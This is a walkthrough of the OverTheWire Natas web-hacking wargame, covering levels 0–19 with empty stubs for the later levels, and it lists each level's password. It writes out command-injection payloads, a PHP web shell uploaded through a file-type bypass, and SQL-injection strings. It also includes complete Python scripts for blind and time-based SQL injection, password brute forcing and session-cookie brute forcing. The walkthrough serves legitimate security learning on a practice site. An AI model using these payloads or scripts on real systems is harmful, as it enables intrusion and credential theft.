Level 0

Information Given:
You can find the password for the next level on this page. 

Solution:
Right-click -> View Page Source

Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto


Level 1

Information Given:
You can find the password for the next level on this page, but rightclicking has been blocked! 

Solution:
Right-click -> View Page Source

Password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi


Level 2

Information Given:
There is nothing on this page 

Solution:
Right-click -> View Page Source
Notice: <img src="files/pixel.png">
Browse to: http://natas2.natas.labs.overthewire.org/files/
Click on "users.txt"

Password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14


Level 3

Information Given:
There is nothing on this page

Solution:
Right-click -> View Page Source
Notice: <!-- No more information leaks!! Not even Google will find it this time... -->
Browse to: http://natas3.natas.labs.overthewire.org/robots.txt
Browse to: http://natas3.natas.labs.overthewire.org//s3cr3t/
Click on "users.txt"

Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ


Level 4

Information Given:
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

Solution:
# This hints at the key being to change the "Referer" parameter in the HTTP request.
Start Burp Proxy with Intercept On
Copy: http://natas5.natas.labs.overthewire.org/
Refresh the page
In Burp: Referer: http://natas5.natas.labs.overthewire.org/
Forward

Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 


Level 5

Information Given:
Access disallowed. You are not logged in

Solution:
# This hints at the key being cookie modification.
Open Cookies Manager+
Search: natas
Edit the cookie from a value of 0 to a value of 1
Refresh the page

Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1


Level 6

Information Given:
We get the source code and an Input bar.

Solution:
'''
Notice the following:

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

'''
Browse to: http://natas6.natas.labs.overthewire.org/includes/secret.inc
Right-click -> View Page Source
# The secret is: FOEIUWGHFEEUHOFUOIU
Input secret: FOEIUWGHFEEUHOFUOIU -> Submit Query

Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 


Level 7

Information Given:
We get a link to "Home" that displays: this is the front page
We get a link to "About" that displays: this is the about page 

Solution:
Click on the "Home" link
Right-click -> View Page Source
# Notice: <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
# Notice the URL of the "Home" page includes: ?page=home
Browse to: http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 


Level 8

Information Given:
We get the source code and an Input bar.

Solution:
'''
Notice the following:

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

We simply have to decrypt the secret.
'''

echo 3d3d516343746d4d6d6c315669563362 | xxd -p -r | rev | base64 -d
# The output is: oubWYf2kBq
Input secret: oubWYf2kBq -> Submit Query

Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl


Level 9

Information Given:
We get an input box "Find words containing", an Output, and the Source Code.

Solution:
'''
Notice the following:

$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}

The code is vulnerable to command injection. 
We can use passthru() to execute other commands by simply adding a semicolon.

'''

;pwd -> Search
; cat /etc/natas_webpass/natas10


Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu


Level 10

Information Given:
We get an input box "Find words containing", an Output, and the Source Code.
This time, "For security reasons, we now filter on certain characters".

Solution:
'''
Notice the following:

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}

There is filtering in place now. However, we can still bypass this.
Instead of a semicolon, we can just use ellipsis (...)


'''
Find words containing: ... cat /etc/natas_webpass/natas11 -> Search

Password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK


Level 11

Information Given:
"Cookies are protected with XOR encryption".
We get an input box titled "Background color" and a button to set the color.
We also get the source code.

Solution:
'''
Notice the following:

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

setcookie("data", base64_encode(xor_encrypt(json_encode($d))));

We can repurpose the source code to get the key and generate the correct cookie.
We will use $defaultdata as the plaintext and the cookie value as the ciphertext.

'''

Open Cookies Manager+ -> Search: natas -> Copy the cookie value
gedit break_natas11.php

<?php

$p_text = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
$c_text = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=");

function xor_encrypt($in, $k) {
    $key = $k;
    $text = $in;
    $outText = '';

    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

print xor_encrypt($p_text, $c_text);

?>

php break_natas11.php
# The output is: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
# The key is: qw8J

Comment out the "print" and add the following to the code above:

// The key was added after running the code above by itself.
$the_key = "qw8J";
$plaintext = array("showpassword"=>"yes", "bgcolor"=>"#ff0000");

print base64_encode(xor_encrypt(json_encode($plaintext), $the_key));

# For the full code, see: break_natas11.php

php break_natas11.php
# The output is: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sQUcIelMK
Open Cookies Manager+ -> Replace the cookie value with the value above
Refresh the page

Password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3


Level 12

Information Given:
"Choose a JPEG to upload (max 1KB)". We get file uploading options and the source code.

Solution:
# The first question that comes to mind is whether we can upload stuff other than JPEGs
vi break_natas12.php
<?php echo exec("cat /etc/natas_webpass/natas13"); ?>

Right-click on "Browse..." -> Inspect Element -> Scroll up to the filename
Change the filename value extension from ".jpg" to ".php"
Upload File
Click on the file link

Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY


Level 13

Information Given:
"For security reasons, we now only accept image files!". We can upload files and we also get the source code.

Solution:
# The first thing that comes to mind is disguising a script as an image file
# We can write the JPEG magic number before our code to trick the program
# See magicNum_trick.py for how I do this
vi pwn_natas13.php
<?php echo exec("cat /etc/natas_webpass/natas14"); ?>

python magicNum_trick.py 1 break_natas13.php pwn_natas13.php
Right-click on "Browse..." -> Inspect Element -> Scroll up to the filename
Change the filename value extension from ".jpg" to ".php"
Upload File
Click on the file link

Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1


Level 14

Information Given:
We get a username field, a password field, and the source code.

Solution:
# From the source code we can see that this is very likely a SQL injection
Username: admin" or "1"="1
Password: admin" or "1"="1

Password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J


Level 15

Information Given:
We get a username field for which we can "check existence" by pressing a button, as well as the source code.

Solution:
'''
Looking at the source code, this is another SQL injection related challenge
We know we're on the money when we get the message "This user exists."
However, this isn't enough, since we very likely also need to get the password right
in order to get the flag 
We are going to have to write a script to bruteforce the process
'''
vi break_natas15.py

from string import ascii_lowercase, ascii_uppercase
import requests


def get_request(target):
	req = requests.get(target)
	
	if req.status_code != requests.codes.ok:
		raise ValueError("[!] Unable to connect to target.")
	else:
		print "[*] Successfully connected to target."


def url_sqli(target):
	# All possible characters
	all_chars = "0123456789" + ascii_lowercase + ascii_uppercase

	# Parsed characters, the characters that exist in the password
	parsed_chars = ""

	# Working password
	password = ""

	# String that verifies we're on the money
	exists = "This user exists."

	for c in all_chars:
		# SQL injection #1 - Using BINARY allows for a case-sensitive comparison
		req = requests.get(target + '?username=natas16" AND password LIKE BINARY "%' + c + '%" "')

		# Verify if password uses current character
		if req.content.find(exists) != -1:
			parsed_chars += c
			print "Chars in password: " + parsed_chars

	print "[*] Characters successfully parsed. \n[*] Starting to brute-force..."

	# With the assumption that passwords are 32-characters long
	for i in range(32):
		for c in parsed_chars:
			# SQL injection #2
			req = requests.get(target + '?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')
		
			# Figuring out the correct location of characters in the password
			if req.content.find(exists) != -1:
				password += c
				print "[*] Password: " + password + ('*' * int(32 - len(password)))
				break

	print "[*] Successfully brute-forced password."


def main():
	target = raw_input("Enter the target URL (E.g., http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/)\n: ")

	get_request(target)
	url_sqli(target)

main()


python break_natas15.py

Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh


Level 16

Information Given:
"For security reasons, we now filter even more on certain characters"
We get an input field where we can "Find words containing: "
We also get the source code.

Solution:
Open "View sourcecode" in a new tab.
'''
Notice the following:

$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}


This is very similar to level 9, where we performed command injection
Although we can't use the semi-colon to inject commands, 
we may still be able to perform command substitution
'''

Find words containing: $(foo) -> Search
# Our query was effective, so we can use command substitution
Find words containing: $(cat /etc/natas_webpass/natas17) -> Search

'''
That didn't work. However, it still serves to know that command substitution is in play
We are going to have to brute-force our way, 
while using a known word so that we get some output
'''

vi break_natas16.py

from string import ascii_lowercase, ascii_uppercase
import requests


def get_request(target):
	req = requests.get(target)
	
	if req.status_code != requests.codes.ok:
		raise ValueError("[!] Unable to connect to target.")
	else:
		print "[*] Successfully connected to target."


def url_command_brute(target):
	# All possible characters
	all_chars = "0123456789" + ascii_lowercase + ascii_uppercase

	# Parsed characters, the characters that exist in the password
	parsed_chars = ""

	# Working password
	password = ""

	# String that verifies we're on the money
	exists = "Output:\n<pre>\n</pre>"

	for c in all_chars:
		# Command injection #1 - using the word "bypassed" as the known word
		req = requests.get(target + '?needle=$(grep ' + c + ' /etc/natas_webpass/natas17)bypassed')

		# Verify if password uses current character
		if req.content.find(exists) != -1:
			parsed_chars += c
			print "Chars in password: " + parsed_chars

	print "[*] Characters successfully parsed. \n[*] Starting to brute-force..."

	# With the assumption that passwords are 32-characters long
	for i in range(32):
		for c in parsed_chars:
			# Command injection #2
			# The ^ is used to grab only what matches what follows after it
			req = requests.get(target+'?needle=$(grep ^' + password + c + ' /etc/natas_webpass/natas17)bypassed')
		
			# Figuring out the correct location of characters in the password
			if req.content.find(exists) != -1:
				password += c
				print "[*] Password: " + password + ('*' * int(32 - len(password)))
				break

	print "[*] Successfully brute-forced password."


def main():
	target = raw_input("Enter the target URL (E.g., http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/)\n: ")

	get_request(target)
	url_command_brute(target)

main()


python break_natas16.py

Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw


Level 17

Information Given:
We get an input field where we can check for the existence of a username.
We also get the source code.

Solution:
Open "View sourcecode" in a new tab.
'''
This is yet another SQL injection challenge

After attempting to retrieve information several times and getting nothing, this leads us to believe that a time-based blind SQL injection might be our way in

This type of injection can be useful in this case because depending on the time it takes for the server to respond to a query, we can deduct whether we are on the right path or not, whether our query is valid or not
'''

vi break_natas17.py

from string import ascii_lowercase, ascii_uppercase
import requests


def get_request(target):
	req = requests.get(target)
	
	if req.status_code != requests.codes.ok:
		raise ValueError("[!] Unable to connect to target.")
	else:
		print "[*] Successfully connected to target."


def time_based_url_sqli(target):
	# All possible characters
	all_chars = "0123456789" + ascii_lowercase + ascii_uppercase

	# Parsed characters, the characters that exist in the password
	parsed_chars = ""

	# Working password
	password = ""

	# String that verifies we're on the money
	exists = "This user exists."

	for c in all_chars:
		try:
			# SQL time-based injection #1 - Sleeps when true, is passed null when false
			req = requests.get(target + '?username=natas18" AND IF(password LIKE BINARY "%' + c + '%", sleep(5), null) %23', timeout=1)

		# If we get a timeout, the password uses current character
		except requests.exceptions.Timeout:
			parsed_chars += c
			print "[*] Chars in password: " + parsed_chars

	print "[*] Characters successfully parsed. \n[*] Starting to brute-force..."

	# With the assumption that passwords are 32-characters long
	for i in range(32):
		for c in parsed_chars:
			try:
				# SQL time-based injection #2
				req = requests.get(target + '?username=natas18" AND IF(password LIKE BINARY "' + password + c + '%", sleep(5), null) %23', timeout=1)
		
			# Figuring out the correct location of characters in the password
			except requests.exceptions.Timeout:
				password += c
				print "[*] Password: " + password + ('*' * int(32 - len(password)))
				break

	print "[*] Successfully brute-forced password."


def main():
	target = raw_input("Enter the target URL (E.g., http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/)\n: ")

	get_request(target)
	time_based_url_sqli(target)

main()


python break_natas17.py

Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP


Level 18

Information Given:
"Please login with your admin account to retrieve credentials for natas19."
We get username and password input boxes, along with the source code.

Solution:
'''
Brute-forcing is the key, yet again.

Notice the following:

$maxid = 640; // 640 should be enough for everyone

if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"]))

if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>"; 


From this information we know the following:
1) There is a 640-try limit
2) We have to brute-force the cookie titled PHPSESSID
3) We get "You are an admin." if our guess is right.

'''

vi break_natas18.py

import requests

def get_request(target):
	req = requests.get(target)
	
	if req.status_code != requests.codes.ok:
		raise ValueError("[!] Unable to connect to target.")
	else:
		print "[*] Successfully connected to target."


def cookie_bruteforce(target):
	# String we get if we're admin
	exists = "You are an admin."

	# Iterate each session and check if there's one with admin access
	for i in range(641):
		if i % 10 == 0:
			print "[*] Checked", str(i), "sessions."

		cookies = dict(PHPSESSID=str(i))
		req = requests.get(target, cookies=cookies)

		# If the page content's has the admin message
		if req.content.find(exists) != -1:
				print "[*] Admin session found: ", str(i)
				print req.content
				break

	print "[*] Successfully brute-forced session."


def main():
	target = raw_input("Enter the target URL (E.g., http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/)\n: ")

	get_request(target)
	cookie_bruteforce(target)

main()


python break_natas18.py


Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs


Level 19

Information Given:
" This page uses mostly the same code as the previous level, but session IDs are no longer sequential...

Please login with your admin account to retrieve credentials for natas20. "

This time we get no source code. Just the above, plus two input boxes for username and password.


Solution:
Log in with username: a
Open Cookies Manager+ and write down the value of PHPSESSID, in my case: 36382d61
Delete the cookie
Log in with username: b
Write down the value of PHPHSESSID: 3438362d62
Delete and repeat with c
Write down the value of PHPSESSID: 3537312d63

'''
The last character is clearly hex.
61 = a
62 = b
63 = c

I use a script I wrote that converts between different formats.
If you want to use it, you can find it here:
Be sure to follow me on Github if you use it! 
'''

./format_convert.py 36382d61 -2ascii
# The result is: 68-a
./format_convert.py 3438362d62 -2ascii
# The result is: 486-b
./format_convert.py 3537312d63 -2ascii
# The result is: 571-c

'''
From this we know that the encryption is: <password>-<username>

Recall from the previous challenge:

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}

If this function is active this time, then it means that the username will be "admin".

We will reuse the code from last challenge, except we will add "-admin" to the guesses and hex encode the cookie.
'''

vi break_natas19.py

import requests

def get_request(target):
	req = requests.get(target)
	
	if req.status_code != requests.codes.ok:
		raise ValueError("[!] Unable to connect to target.")
	else:
		print "[*] Successfully connected to target."


def cookie_bruteforce(target):
	# String we get if we're admin
	exists = "You are an admin."

	# Iterate each session and check if there's one with admin access
	for i in range(641):
		if i % 10 == 0:
			print "[*] Checked", str(i), "sessions."

		cookies = dict(PHPSESSID=(str(i)+"-admin").encode("hex"))
		req = requests.get(target, cookies=cookies)

		# If the page content's has the admin message
		if req.content.find(exists) != -1:
				print "[*] Admin session found: ", str(i)
				print req.content
				break

	print "[*] Successfully brute-forced session."


def main():
	target = raw_input("Enter the target URL (E.g., http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/)\n: ")

	get_request(target)
	cookie_bruteforce(target)

main()


python break_natas19.py


Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF 


Level 20

Information Given:
"You are logged in as a regular user. Login as an admin to retrieve credentials for natas21. "

We are given an input box titled "Your name:", a button titled "Change name", as well as the source code.

Solution:


Password:


Level 21

Information Given:


Solution:


Password:


Level 22

Information Given:


Solution:


Password:


Level 23

Information Given:


Solution:


Password:


Level 24

Information Given:


Solution:


Password:


Level 25

Information Given:


Solution:


Password:


Level 26

Information Given:


Solution:


Password:


Level 27

Information Given:


Solution:


Password:


Level 28

Information Given:


Solution:


Password:


Level 29

Information Given:


Solution:


Password:


Level 30

Information Given:


Solution:


Password:


Level 31

Information Given:


Solution:


Password:


Level 32

Information Given:


Solution:


Password:


Level 33

Information Given:


Solution:


Password:

